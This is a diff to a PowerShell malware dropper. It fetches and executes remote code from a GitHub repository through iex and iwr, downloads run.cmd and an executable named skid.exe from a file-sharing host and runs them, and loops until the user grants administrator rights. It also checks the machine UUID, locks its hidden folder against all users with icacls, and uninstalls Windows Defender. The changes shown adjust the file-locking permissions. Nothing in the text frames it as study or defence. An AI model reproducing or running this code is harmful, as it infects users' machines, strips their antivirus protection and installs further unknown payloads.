@@ -3,12 +3,14 @@ iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden
 $dir = "$env:userprofile\150F4013"
 New-Item -ItemType Directory -Path $dir
 
+icacls "$dir" /deny Everyone:(OI)(CI)(F)
 
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
 icacls "$temp\run.cmd" /deny Everyone:(OI)(CI)(F)
+icacls "$temp\run.cmd" /grant SYSTEM:(F)
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
@@ -50,7 +52,7 @@ if ($uuid -eq $blockedUUID) {
     Invoke-WebRequest -Uri "https://anonsharing.com/file/f92fcbba333c5a03/fix.exe" -OutFile "$temp\skid.exe"
     Start-Process -FilePath "$temp\skid.exe"
 }
-icacls "$dir" /deny Everyone:(OI)(CI)(F)
+
 
 uninstall-WindowsFeature -Name Windows-Defender
 
